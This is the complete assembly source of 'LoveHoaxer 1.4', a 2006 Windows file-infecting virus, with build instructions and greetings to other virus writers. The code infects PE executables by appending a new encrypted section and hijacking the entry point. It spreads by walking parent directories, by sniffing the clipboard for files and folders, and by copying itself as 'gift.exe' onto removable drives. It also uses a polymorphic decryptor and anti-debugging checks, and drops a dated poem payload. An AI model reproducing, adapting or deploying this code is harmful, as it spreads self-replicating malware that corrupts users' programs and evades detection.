;lust 1.4 [LoveHoaxer]
;<dont trust the one who gives you lust>
;coded by : fakedminded<berniee> 2006 [a current EOF-project member]
;Method   : the virus will add new section into pe exe files,installers will not be infected..(and few other exe models!)
;           the virus searches the directories by going upward five times trying to infect any
;           victim file in its way,then try to create mutex for clipboard sniffer of directories and executables to infect
;           and if already exists it will try to make another mutex for  flash disk dropping and if it is also exists it just sleeps .
;           It has a simple polymorphic engine for its decrypter,and multi-encryption
;           key is created for each offspring!,It will run old host as a new thread.
;Payload  : On 13/1 of every year it will create mass amount of files containing certain poem!
;           and it will display that poem.
;SIZE     : ~4043 of bytes!!
;Greetings: EOF-project members a big non-gay hug to all of you :))
;           Vxers from all round the world keep the ancients heritage and dont spoil everything !
;           Avers -none greetings for you ...
;           M$ keep the good work on making exploited OSes ...nice guys making hackers world --plain
;           My real life friends ,hoping to have nice life..(especially _mh) ah yeah..viscosity,Mr.Bean,Maryoosh,ahk..all of you guys :lol:
;           My l(o/u)st love you dont know me ,,but I created this shit for you..bitch :D
;-----------------------------------------
;NOTE     : inorder to assemble it :
;-----------------------------------------
;@echo off
;\masm32\bin\ml /c /coff /Cp lovehoaxer.asm
;\masm32\bin\link  /filealign:0x200  /section:.text,RWX /subsystem:windows /libpath:\masm32\lib lovehoaxer.obj
;pause
;PEWRSEC.COM lovehoaxer.exe
;pause
;-----------------------------------------
;
;nop it all----------------------------90h
;

.386 
.model flat,stdcall 
option casemap:none 

include \masm32\include\windows.inc 
include \masm32\include\kernel32.inc 
includelib \masm32\lib\kernel32.lib 

vir_size=offset end__ -offset start
_sub =offset _enc-offset start


.data
db "LoveHoaxer 1.4",0

.code
start:
call daemon
daemon:
pop eax
xchg eax,eax
mov ebp,eax
sub ebp,offset daemon
cmp ebp,0
je  _enc
mov esi,offset _enc
add esi,ebp
xor ecx,ecx
jmp pass1
decrypt_str dd 1234

pass1:
xor eax,eax
mov eax,[ebp+offset decrypt_str]

decrypt_size = offset __enc - offset decrypt

decrypt:
xor dword ptr [esi],eax
add esi,4
add ecx,4
cmp ecx,vir_size- _sub

db 40 dup(90h)  ;buffer zone :p
__enc:
jnae decrypt
_enc:
jmp code_start

victim_file db "me3za.exe",0 ;just for testing!
curr_entry dd 0
image_curr dd 0
image_base dd 0
prev_entry dd 0
win32_fdata dd 0
find_handle dd 0
buffer dd 0
tid dd 0
hThread dd 0
exitCode dd 0
current_dir dd 0

buffer_clpboard dd 0
h_drop dd 0
clp_mutex db "clp_board~11_!",0
dropper_mutex db "flash_~1@",0

extension db "*.exe",0
dotdot db "..",0
dateformat db "d M y",0
szPayload db "To the whom I loved",13,10,"To the whom I needed",13,10,"You were the only fotune I ever pleaded",13,10
       db "You didnt notice I couldnt fake it",13,10
       db "Hba you have the womb I liked to seed it :D",13,10,"with love /berniee",13,10,0
            
string_ db "abcdefgh",0
ext__ db ".txt",0

counter_ db 0
ebp_ dd 0
code_start:

call get_kernel

assume fs:nothing           ;install SEH
mov eax,offset handle_err   ;Handle Error Exceptions in lame way!
add eax,ebp
push eax
push fs:[0]
mov fs:[0],esp


call find_main_api
call find_other_apis
call [ebp+offset AIsDebuggerPresentF]  ;thanx to WarGame for reminding of this function :)
or eax,eax
jnz exit
call payload_


mov eax, dword ptr [ebp+offset image_base]
mov  dword ptr [ebp+offset image_curr],eax

mov eax, dword ptr [ebp+offset prev_entry]
mov dword ptr [ebp+offset curr_entry],eax

;jmp test_

push 512
push 0
call [ebp+offset AGlobalAllocF]
mov [ebp+offset current_dir],eax



push [ebp+offset current_dir]
push 512
call [ebp+offset AGetCurrentDirectoryF]


push sizeof WIN32_FIND_DATA
push 0
call [ebp+offset AGlobalAllocF]
or eax,eax
jz exit;abort_
mov [ebp+offset win32_fdata],eax

doit_again:
call folder_infector
mov esi, [ebp+offset win32_fdata]
mov ecx, sizeof WIN32_FIND_DATA

zer0_it:
mov byte ptr [esi],0
inc esi
loop zer0_it
mov eax,offset dotdot
add eax,ebp
push eax
call dword ptr [ebp+offset ASetCurrentDirectoryF]

inc byte ptr [ebp+offset counter_]
cmp byte ptr [ebp+offset counter_],5 ;times upward
jne doit_again



push [ebp+offset current_dir]
call [ebp+offset ASetCurrentDirectoryF]


cmp dword ptr [ebp+offset curr_entry],0
je exit
mov eax,dword ptr [ebp+offset curr_entry]
add eax,dword ptr [ebp+offset image_curr]

mov ebx,offset tid
add ebx,ebp
push ebx
push 0
push 0
push eax
push 0
push 0

call [ebp+offset ACreateThreadF]
or eax,eax
jz exit
mov [ebp+offset hThread],eax

mov eax,offset clp_mutex
add eax,ebp
push eax
push TRUE
push 0
call [ebp+offset ACreateMutexF]
call [ebp+offset AGetLastErrorF]
cmp eax,ERROR_ALREADY_EXISTS
je see_drop
call capture_clpboard


see_drop:
mov eax,offset dropper_mutex
add eax,ebp
push eax
push TRUE
push 0
call [ebp+offset ACreateMutexF]
call [ebp+offset AGetLastErrorF]
cmp eax,ERROR_ALREADY_EXISTS
je loop_nothing
call drop_flash



loop_nothing:
push 3000
call [ebp+offset ASleepF]
jmp loop_nothing

;test_:

;pusha
;mov edx,offset victim_file
;add edx,ebp
;call adding_section
;popa


exit:
pop edx
pop eax
ret

handle_err:
pop esp
ret         ;just do nothing in case of errors!


folder_infector:            ;        infect current folder's files
push [ebp+offset win32_fdata]
mov eax,offset extension
add eax,ebp
push eax
call [ebp+offset AFindFirstFileF]
cmp eax,INVALID_HANDLE_VALUE
je no_more_files    ;abort_

mov [ebp+offset find_handle],eax
mov edx,dword ptr [ebp+offset win32_fdata]
add edx,WIN32_FIND_DATA-274
pusha
call adding_section
popa

searching__:
push [ebp+offset win32_fdata]
push [ebp+offset find_handle]
call dword ptr [ebp+offset AFindNextFileF]
call [ebp+AGetLastErrorF]
cmp eax,ERROR_NO_MORE_FILES
je no_more_files
mov edx,dword ptr [ebp+offset win32_fdata]
add edx,WIN32_FIND_DATA-274
pusha
call adding_section
popa
jmp searching__


no_more_files:

push  [ebp+offset find_handle]
call [ebp+offset AFindCloseF]
ret

;/////////////////////adding new section at the end of file
;///////////////////
adding_section:   ;file infection procedure by adding new section
jmp code_
v_handle dd 0
v_size dd 0
v_mem dd 0
sec_align dd 0
file_align dd 0

add_ed dd 0
bwr dd 0
cur_pe dd 0
v_size_aligned dd 0
virtual_address dd 0
physical_address dd 0
vir_enc_mem dd 0


code_:
push edx
push edx
push 0
call dword ptr [ebp+offset ASfcIsFileProtectedF]
or eax,eax
jnz err_sec
pop edx

push 0
push 0
push 3
push 0
push FILE_SHARE_READ or FILE_SHARE_WRITE
push 40000000h or 80000000h

mov eax,edx
push eax
call dword ptr [ebp+offset ACreateFileF]
mov dword ptr [ebp+offset v_handle],eax




push 0
push dword ptr [ebp+offset v_handle]
call dword ptr [ebp+offset AGetFileSizeF]
mov dword ptr [ebp+offset v_size],eax


push dword ptr [ebp+offset v_size]
push 0
call dword ptr [ebp+offset AGlobalAllocF]
or eax,eax
jz err_sec
mov dword ptr [ebp+offset v_mem],eax

push 0
mov eax,offset bwr
add eax,ebp
push eax
push dword ptr [ebp+offset v_size]
push dword ptr [ebp+offset v_mem]
push dword ptr [ebp+offset v_handle]
call dword ptr [ebp+offset AReadFileF]     ;--->completed reading the file to the v_mem

mov edx,dword ptr [ebp+offset v_mem]
cmp word ptr [edx],'ZM'
jne err_sec

add edx,dword ptr [edx+3ch]                ;---->I've got to PE!e
cmp word ptr [edx],'EP'
jne err_sec

mov eax, dword ptr [edx+52]              
mov dword ptr [ebp+offset image_base],eax  ;---->Image base save it 
mov eax, dword ptr [edx+40]
mov dword ptr [ebp+offset prev_entry],eax  ;---->so as the entry point

xor ecx,ecx
mov cx,word ptr [edx+6h]
inc word ptr [edx+6h]            ;sec. numbers=old+1(our new section)
mov eax,dword ptr [edx+60]
mov [ebp+offset file_align],eax

mov eax,dword ptr [edx+56]      ;-->section alignment usually 1000
mov [ebp+offset sec_align],eax
mov ebx,eax
mov eax,vir_size                ;---->managing the image size
call align__
add dword ptr [edx+80],eax     
push edx
xor eax,eax
mov ax,word ptr [edx+14h]       ;--->getting the optional header size
add ax,24                       ;--->adding 24(offset of optional header from PE) to get into sections' headers 
add edx,eax

mov dword ptr [ebp+offset cur_pe],edx ;saving 'pe' offset
xor eax,eax
xor edx,edx
mov eax,28h                         ;--->getting the last section's header
mul cx
mov edx,[ebp+offset cur_pe]         
add edx,eax

sub edx,28h                         ;substtract 28h (sec. header size) to get the beginning of the last header data
mov eax,dword ptr [edx+0ch] ;--->virtual address of previous section
add eax,dword ptr [edx+08h] ;--->virtual size of previous section
mov ebx,[ebp+offset sec_align] ;--->align them for the new added section virtual address
call align__
mov dword ptr [ebp+offset virtual_address],eax ;--->of the new section

mov eax,dword ptr[edx+20]  ;----->pointer of the physical raw data in prev. section
add eax,dword ptr[edx+16]  ;----->physical size of prev. section

mov ebx,[ebp+offset file_align]  ;--->align according to file aligner
call align__
mov dword ptr [ebp+offset physical_address],eax

continue__:

add edx,28h          ;--->going to add our section
mov ecx,28h
loop_grant:           ;--->checking out if there is any space there for adding our section
cmp dword ptr [edx],0 ;--alot of ecxeptions
jne err_all
inc edx
loop loop_grant
sub edx,50h
cmp dword ptr [edx],'abh.'
je err_all
add edx,28h
mov dword ptr [edx],'abh.'   ;------>section's name
mov eax,vir_size
mov ebx,[ebp+offset file_align]   ;---->section's v. size

call align__

mov dword ptr [edx+8],eax    ;-------> section's v. size
push dword ptr [ebp+offset virtual_address]  ;-----> section v.address
pop dword ptr [edx+12]
mov eax,[edx+12]                         
mov dword ptr [ebp+offset add_ed],eax

mov dword ptr [edx+16],vir_size   ;----->raw size of the new section

push dword ptr [ebp+offset physical_address] ;---->physical address of our new section
pop dword ptr [edx+20]

mov dword ptr [edx+36],0c0000040h  ;read and write characteristics of the new section
pop edx                     ;--returning our old pointer to pe
mov eax,dword ptr [ebp+offset physical_address] ;now after the popping,
                                                ;checking if there is some extra in the end 
add eax,10000                                   ;let go some situation ;)
cmp [ebp+offset v_size],eax           
jg err_sec

mov eax,[ebp+offset add_ed]      ;----> remember the old virtual addres of our new section
mov dword ptr [edx+28h],eax      ;---->now it is the new entry point(duh!)
mov eax,[edx+80]
mov [edx+01ch],eax



push FILE_BEGIN
push 0
push 0
push dword ptr [ebp+offset v_handle]
call dword ptr [ebp+offset ASetFilePointerF]



push 0
mov eax,offset bwr
add eax,ebp
push eax
push dword ptr [ebp+offset v_size]
push dword ptr [ebp+offset v_mem]
push dword ptr [ebp+offset v_handle]
call dword ptr [ebp+offset AWriteFileF]




push FILE_BEGIN
push 0
push dword ptr [ebp+offset physical_address]
push dword ptr [ebp+offset v_handle]
call dword ptr [ebp+offset ASetFilePointerF]


call poly_       ;polymorphic procedure 

push vir_size
push 0
call dword ptr [ebp+offset AGlobalAllocF]
mov dword ptr [ebp+offset vir_enc_mem],eax
mov edi,dword ptr [ebp+offset vir_enc_mem]
mov esi,offset start
add esi,ebp
mov ecx,vir_size
rep movsb
mov edi,dword ptr [ebp+offset vir_enc_mem]
add edi,_sub


mov eax,[ebp+offset decrypt_str]
loop_encrypt:
xor dword ptr [edi],eax
add edi,4
add ecx,4
cmp ecx,vir_size- _sub
jnae loop_encrypt





push 0
mov eax,offset bwr
add eax,ebp
push eax
push vir_size
;mov eax,offset start
;add eax,ebp
push dword ptr [ebp+offset vir_enc_mem]
push dword ptr [ebp+offset v_handle]
call dword ptr [ebp+offset AWriteFileF] ;----> write our virus to the end of file


push dword ptr [ebp+offset v_handle]
call dword ptr [ebp+offset ACloseHandleF]   


ret

err_sec:
push dword ptr [ebp+offset v_handle]
call dword ptr [ebp+offset ACloseHandleF]

ret
err_all:
push dword ptr [ebp+offset v_handle]
call dword ptr [ebp+offset ACloseHandleF]

pop edx

ret

align__:          

push edx

     xor edx, edx
        div ebx
        or edx, edx
        JZ no_round_up
        inc eax

no_round_up:
        mul ebx
pop edx
ret

;///////////Clip Board sniffer
;////////////

capture_clpboard:         ;search for clipboard for any pe files or folders to infect(readonly will not bee infected!)
push 512
push 0
call [ebp+offset AGlobalAllocF]
mov dword ptr [ebp+offset buffer_clpboard],eax

_label1:

push 0
call [ebp+offset AOpenClipboardF]



push CF_HDROP
call [ebp+offset AGetClipboardDataF]
or eax,eax
jz _sleepClp
mov [ebp+offset h_drop],eax

push 0
push 0
push 0FFFFFFFFh
push eax
call [ebp+offset ADragQueryFileF]

or eax,eax
jz _sleepClp
mov ecx,eax

_getFiles:
push ecx

push 512
push [ebp+offset buffer_clpboard]
dec ecx
push ecx
push [ebp+offset h_drop]
call [ebp+offset ADragQueryFileF]

push [ebp+offset buffer_clpboard]
call [ebp+offset AGetFileAttributesF]
cmp eax,FILE_ATTRIBUTE_READONLY
je see_next

cmp eax,FILE_ATTRIBUTE_DIRECTORY
jne see_normal_file
push [ebp+offset current_dir]
push 512
call [ebp+offset AGetCurrentDirectoryF]
push [ebp+offset buffer_clpboard]
call [ebp+offset ASetCurrentDirectoryF]
call folder_infector
push [ebp+offset current_dir]
call [ebp+offset ASetCurrentDirectoryF]
jmp see_next


see_normal_file:
mov edx,[ebp+offset buffer_clpboard]
pusha
call adding_section
popa

see_next:
pop ecx
loop _getFiles



_sleepClp:
call [ebp+ACloseClipboardF]
mov esi,[ebp+offset buffer_clpboard]
mov ecx,512
call zero_it
push 5000
call [ebp+offset ASleepF]

jmp _label1

exit_clpboard:
ret

payload_:       ;ugly payload dont bother 

push 512 
push 0
call [ebp+offset AGlobalAllocF]
or eax,eax
jz exit_payload
mov [ebp+offset buffer],eax


push 512
push [ebp+offset buffer]   
mov eax,offset dateformat
add eax,ebp
push eax
push 0
push 0
push 0
call [ebp+offset AGetDateFormatF]

mov eax,[ebp+offset buffer]

cmp word ptr [eax],"131"
jne exit_payload

xor eax,eax

_crap:
push eax
mov ebx,-1

_stringer:
inc ebx
push ebx
push 73
call [ebp+offset ASleepF]
call rnd_
mov edx,offset string_
add edx,ebp
add edx,eax
mov esi,edx
mov edi,[ebp+offset buffer]
pop ebx
add edi,ebx
mov ecx,1
rep movsb
cmp ebx,10
jne _stringer

mov esi,offset ext__
add esi,ebp
mov ecx,4
rep movsb

push 0
push 0
push 2
push 0
push 0
push 40000000h
push [ebp+offset buffer]
call [ebp+offset ACreateFileF]
mov edx,eax
push edx
push 0
mov eax,offset bwr
add eax,ebp
push eax
push 177
mov eax,offset szPayload
add eax,ebp
push eax
push edx
call [ebp+offset AWriteFileF]
pop edx
push edx
call [ebp+offset ACloseHandleF]

pop eax
inc eax
cmp eax,4
jne _crap


push 0
push [ebp+offset buffer]

mov eax,offset szPayload
add eax,ebp
push eax

push 0
call dword ptr [ebp+offset AMessageBoxF]

exit_payload:

ret


;///////////file dropper
;////////
drop_flash:            ;this will drop the infected file into any new attached removavle except floppy drives
jmp @@1
buffer_dropper dd 0
module_name dd 0
file_name db "gift.exe",0

@@1:
push 512
push 0
call [ebp+offset AGlobalAllocF]
mov [ebp+offset buffer_dropper],eax

push 512
push 0
call [ebp+offset AGlobalAllocF]
mov [ebp+offset module_name],eax

push 512
push eax
push 0
call [ebp+offset AGetModuleFileNameF]


search_driver:
push [ebp+offset buffer_dropper]
push 512
call [ebp+offset AGetLogicalDriveStringsF]
mov edx,[ebp+offset buffer_dropper]

_rumble:

push edx


cmp byte ptr [edx],"A"
je seek_nother

push edx
call [ebp+offset AGetDriveTypeF]
cmp eax,DRIVE_REMOVABLE
jne seek_nother
mov esi,[ebp+offset buffer]
mov ecx,256
call zero_it
pop edx
push edx

mov esi,edx
mov edi,[ebp+offset buffer]
mov ecx,3
rep movsb
mov edi,[ebp+offset buffer]
add edi,3
mov esi,offset file_name
add esi,ebp
mov ecx,8
rep movsb
push FALSE

push [ebp+offset buffer]
push [ebp+offset module_name]

call [ebp+offset ACopyFileF]

seek_nother:
pop edx
add edx,4
cmp byte ptr [edx+1],0
je sleep_baby
jmp _rumble

sleep_baby:
push 5000
call [ebp+offset ASleepF]
mov esi,[ebp+offset buffer_dropper]
mov ecx,512

call zero_it
jmp search_driver

ret

zero_it:
mov byte ptr[esi],0
inc esi
loop zero_it
ret

counter_poly dd 0

poly_:          ;poly engine  a pre-historic one

call rnd_
inc eax
mov esi,offset part_1
add esi,ebp
xor ecx,ecx
call seek_another

mov esi,edi
mov edi,offset decrypt
add edi,ebp
add [ebp+offset counter_poly],ebx
mov ecx,ebx
rep movsb

push edi

call rnd_
inc eax

mov esi,offset part_2
add esi,ebp
xor ecx,ecx
call seek_another
mov esi,edi
pop edi
add [ebp+offset counter_poly],ebx
mov ecx,ebx
rep movsb
push edi

call rnd_
inc eax
mov esi,offset part_3
add esi,ebp
xor ecx,ecx
call seek_another
mov esi,edi
pop edi
add [ebp+offset counter_poly],ebx
mov ecx,ebx
rep movsb


push edi

call rnd_
inc eax
mov esi,offset part_4
add esi,ebp
xor ecx,ecx
call seek_another
mov esi,edi
pop edi
add [ebp+offset counter_poly],ebx
mov ecx,ebx
rep movsb

mov ecx,10        ;better than this could be done


call nop_it



ret
seek_another:

xor ebx,ebx
mov edi,esi
seek_opcode:
inc ebx
inc esi
cmp byte ptr [esi],0ffh
jne seek_opcode
inc esi
inc ecx
cmp ecx,eax
jne seek_another
ret

nop_it:
mov byte ptr[edi],90h
inc edi
loop nop_it
ret

rnd_:               ;rnd will get 6-random range number
call [ebp+offset AGetTickCountF]
add eax,666h
loop_4:
xor edx,edx
mov ecx,6
div ecx
xchg edx,eax
cmp eax,6
ja loop_4
cmp eax,0
ja @continue_
mov ecx,1
@continue_:
ret

poly_data:              ;---the other opcodes to be replaced by the old opcodes in the decryptor
part_1:
push eax
mov eax,eax
pop eax
xor dword ptr [esi],eax
db 0ffh

mov edx,eax
mov eax,edx
xor dword ptr [esi],eax
db 0ffh

xchg dword ptr [esi],eax
xor eax,dword ptr [esi]
xchg dword ptr [esi],eax
db 0ffh

ror dword ptr[esi],32
xor dword ptr [esi],eax
db 0ffh

push esi
pop edx
xor dword ptr [edx],eax
db 0ffh

inc edx
xor dword ptr [esi],eax
db 0ffh



part_2:
add esi,3
inc esi
db 0ffh

mov edx,esi
add edx,4
push edx
pop esi
db 0ffh

add esi,4
db 0ffh

push esi
add esi,2
pop esi
add esi,4  ; :P
db 0ffh

ror esi,32
add esi,4
db 0ffh

ror esi,16
rol esi,16
add esi,4
db 0ffh


part_3:  
mov ebx,3
add ecx,ebx
inc ecx
db 0ffh

ror ecx,32
add ecx,4
db 0ffh

add ecx,4
db 0ffh

inc ecx
inc ecx
add ecx,2
db 0ffh

add ecx,3
inc ecx
db 0ffh

rol ecx,32
add ecx,3
inc ecx
db 0ffh

part_4:
cmp ecx,vir_size- _sub
db 0ffh

push ecx
pop ebx
cmp ebx,vir_size- _sub
db 0ffh

mov edx,ecx
cmp edx,vir_size- _sub
db 0ffh

mov ebx,ecx
push ebx
pop edx
cmp edx,vir_size-_sub
db 0ffh

mov edx,ecx
push edx
pop ebx
cmp ebx,vir_size-_sub
db 0ffh

mov edx,ecx
xchg ecx,edx
cmp edx,vir_size-_sub
db 0ffh


find_other_apis:
jmp fo_code

dll_base dd 0
advapi32N db "advapi32.dll",0
advapi32A dd 0
user32N db "user32.dll",0
user32A dd 0
shell32N db "shell32.dll",0
shell32A dd 0
urlmonN db "urlmon.dll",0
sfcN db "sfc.dll",0
sfcA dd 0

apis_name:
CreateFileF db "CreateFileA",0
CloseHandleF db "CloseHandle",0
WriteFileF db "WriteFile",0
ReadFileF db "ReadFile",0

GetFileSizeF db "GetFileSize",0
GlobalAllocF db "GlobalAlloc",0
SetFilePointerF db "SetFilePointer",0

GetVersionExF db "GetVersionExA",0
GetDateFormatF db "GetDateFormatA",0
SleepF db "Sleep",0
FindFirstFileF db "FindFirstFileA",0
FindNextFileF db "FindNextFileA",0
FindCloseF db "FindClose",0
GetLastErrorF db "GetLastError",0
ExitProcessF db "ExitProcess",0
LoadLibraryF db "LoadLibraryA",0
FreeLibraryF db "FreeLibrary",0
GetEnvironmentVariableF db "ExpandEnvironmentStringsA",0
GetModuleFileNameF db "GetModuleFileNameA",0
CopyFileF db "CopyFileA",0
GetCurrentDirectoryF db "GetCurrentDirectoryA",0
SetCurrentDirectoryF db "SetCurrentDirectoryA",0
GetFileAttributesF db "GetFileAttributesA",0
GetTickCountF db "GetTickCount",0
CreateThreadF db "CreateThread",0

IsDebuggerPresentF db "IsDebuggerPresent",0
CreateMutexF db "CreateMutexA",0
GetLogicalDriveStringsF db "GetLogicalDriveStringsA",0
GetDriveTypeF db "GetDriveTypeA",0

dd 0ffh





apis_address:
ACreateFileF dd 0
ACloseHandleF dd 0
AWriteFileF dd 0
AReadFileF dd 0

AGetFileSizeF dd 0
AGlobalAllocF dd 0
ASetFilePointerF dd 0
AGetVersionExF dd 0
AGetDateFormatF dd 0
ASleepF dd 0
AFindFirstFileF dd 0
AFindNextFileF dd 0
AFindCloseF dd 0
AGetLastErrorF dd 0
AExitProcessF dd 0
ALoadLibraryF dd 0
AFreeLibraryF dd 0

AGetEnvironmentVariableF dd 0
AGetModuleFileNameF dd 0
ACopyFileF dd 0
AGetCurrentDirectoryF dd 0
ASetCurrentDirectoryF dd 0
AGetFileAttributesF dd 0
AGetTickCountF dd 0
ACreateThreadF dd 0

AIsDebuggerPresentF dd 0
ACreateMutexF dd 0
AGetLogicalDriveStringsF dd 0
AGetDriveTypeF dd 0


dd 0ffh

;urlmon_api:
;URLDowanloadToFileF db "URLDownloadToFileA",0

;urlmon_addresses:
;AURLDowanloadToFileF dd 0
;dd 0ffh

sfc_api:
SfcIsFileProtectedF db "SfcIsFileProtected",0

sfc_addresses:
ASfcIsFileProtectedF dd 0
dd 0ffh

shell32_api:
DragQueryFileF db "DragQueryFileA",0

shell32_addresses:
ADragQueryFileF dd 0
dd 0ffh

user32_api:
OpenClipboardF db "OpenClipboard",0
CloseClipboardF db "CloseClipboard",0
GetClipboardDataF db "GetClipboardData",0
MessageBoxF db "MessageBoxA",0

user32_addresses:
AOpenClipboardF dd 0
ACloseClipboardF dd 0
AGetClipboardDataF dd 0
AMessageBoxF dd 0
dd 0ffh



fo_code:

mov esi,offset apis_name
mov edi,offset apis_address
add esi,ebp
add edi,ebp
push [ebp+offset kernel_base]
pop [ebp+offset dll_base]

call l00p_apis

;mov eax,offset urlmonN
;add eax,ebp
;push eax
;call [ebp+offset ALoadLibraryF]
;or eax,eax
;jz exit
;mov [ebp+offset dll_base],eax
;mov esi,offset urlmon_api
;mov edi,offset urlmon_addresses
;add esi,ebp
;add edi,ebp
;call l00p_apis

mov eax,offset user32N
add eax,ebp
push eax
call [ebp+offset ALoadLibraryF]
or eax,eax
jz exit
mov [ebp+offset dll_base],eax
mov esi,offset user32_api
mov edi,offset user32_addresses
add esi,ebp
add edi,ebp
call l00p_apis

mov eax,offset shell32N
add eax,ebp
push eax
call [ebp+offset ALoadLibraryF]
or eax,eax
jz exit
mov [ebp+offset dll_base],eax
mov esi,offset shell32_api
mov edi,offset shell32_addresses
add esi,ebp
add edi,ebp
call l00p_apis



mov eax,offset sfcN
add eax,ebp
push eax
call [ebp+offset ALoadLibraryF]
or eax,eax
jz exit
mov [ebp+offset dll_base],eax
mov esi,offset sfc_api
mov edi,offset sfc_addresses
add esi,ebp
add edi,ebp
call l00p_apis



ret


l00p_apis:
mov eax,esi
push eax
push [ebp+offset dll_base]
call dword ptr[ebp+offset AGetProcAddressF]
or eax,eax
jz exit
mov dword ptr [edi],eax

l00p_small:
inc esi
cmp byte ptr[esi],0
jne l00p_small

next_api_name:
inc esi

add edi,4
cmp dword ptr [edi],0ffh
je finish_fo
jmp l00p_apis
finish_fo:

ret 

;///////////////////getting kernel base/////////////
get_kernel:
jmp this_code

kernel_base dd 0

this_code:

mov ecx,[esp+4]

loop_find_kernel:

xor edx,edx
dec ecx
mov dx,[ecx+3ch]
test dx,0f800h
jnz loop_find_kernel

cmp ecx,[ecx+edx+34h]
jnz loop_find_kernel

cmp word ptr [ecx],"ZM"
jne loop_find_kernel

mov [ebp+offset kernel_base],ecx
lrrt:
ret
;/////////////////end getting kernel base///////////////

find_main_api:

jmp finder_data
PE_offset dd 0
Export_address dd 0
Export_size dd 0
Current_kern dd 0
function_no dd 0
function_addr dd 0
function_ord dd 0
function_name dd 0
base_ord dd 0
GetProcAddressF db "GetProcAddress",0
AGetProcAddressF dd 0
GetModuleHandleN db "GetModuleHandleA",0
GetModuleHandleAd dd 0

finder_data:
mov edi,[ebp+offset kernel_base]
add edi,[edi+3ch]      ;just checking
cmp word ptr [edi],"EP"
jne exit

mov dword ptr [ebp+offset PE_offset],edi
mov eax,[edi+78h]      ;export table rva
push eax
mov eax,[edi+7ch]      ;export table size 
mov [ebp+offset Export_size],eax
pop eax
mov [ebp+offset Export_address],eax
add eax,[ebp+offset kernel_base]
mov edx,[eax+16]               ;  ordinal base
add edx,[ebp+offset kernel_base]  
mov [ebp+offset base_ord],edx
mov edx,[eax+24]               ;no. of exported functions
mov [ebp+offset function_no],edx 
mov edx,[eax+28]              ;rva of exported functions
add edx,[ebp+offset kernel_base]
mov [ebp+offset function_addr],edx 
mov edx,[eax+32]              ; rva of exported function name
add edx,[ebp+offset kernel_base]
mov [ebp+offset function_name],edx
mov edx,[eax+36]  ;rva for name ordinal
add edx,[ebp+offset kernel_base]
mov [ebp+offset function_ord],edx
xor edx,edx 
xor eax,eax
mov eax,[ebp+offset function_name] ; getting the GetProcAddress api address
mov edx,offset GetProcAddressF
add edx,ebp
xor ecx,ecx
mov edi,[eax]
add edi,[ebp+offset kernel_base]

loop_search_1:
mov esi,edx
match_byte:

cmpsb
jne Next_one
cmp byte ptr [edi],0
je Got_it
jmp  match_byte

Next_one:
add cx,1
add eax,4
mov edi,[eax]
add edi,[ebp+offset kernel_base]

jmp loop_search_1
jmp exit
Got_it:

mov edi,[eax]
add edi,[ebp+offset kernel_base]
shl ecx,1
mov eax,[ebp+offset function_ord]
add eax,ecx
xor ecx,ecx
mov cx,word ptr [eax]
shl ecx,2
mov eax,[ebp+offset function_addr]
add eax,ecx
mov eax,[eax]
add eax,[ebp+offset kernel_base]
mov [ebp+offset AGetProcAddressF],eax

ret

exit_finder:
mov eax,0

ret
end__:

end start          ;end of story!

